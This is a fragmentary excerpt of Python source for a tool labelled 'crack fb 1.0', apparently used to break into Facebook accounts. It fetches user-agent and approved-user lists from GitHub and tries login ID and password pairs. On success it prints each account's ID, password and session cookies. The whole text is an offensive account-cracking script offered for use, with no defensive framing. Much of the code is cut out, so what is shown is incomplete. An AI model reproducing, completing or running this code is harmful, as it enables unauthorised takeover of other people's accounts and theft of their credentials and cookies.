...
def uaku():
	try:
		...
		a=requests.get('https://raw.githubusercontent.com/SHAHZAD-AAHME/LOVER/main/Approved.txt').text
		ua=open('.bbnew.txt','w')
...
│    ──────────────────────────                                              crack fb 1.0      │
└──────────────────────────────────────────────────────────────────────────────────────────────┘  	
			{m} ☯︎ {k} ☯︎ {h} ☯︎ {sir} CODER : SHAHZADA{x}{m} ☯︎ {k} ☯︎ {h} ☯︎ {x}''')
...
def chk(): 
  ...
  print ("\033[1;92m╰────────────────────────────────────────────╯")
  try: 
    httpCaht = requests.get("https://raw.githubusercontent.com/Ancestors45/fghjghgh/main/use.txt").text 
    if id in httpCaht: 
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t( ͠° ͟ʖ ͡°) WELCM 2 SAJJAD TOOLS : [green]🇨 🇴 🇰 🇮  [white] (;´༎ຶٹ༎ຶ`)'))
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='SAJJADYT CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='SAJJADYT OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]RYDAH XYBER OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]SAJJADYT OK[/bold green]'))
					ok+=1
					break
			else:
				continue
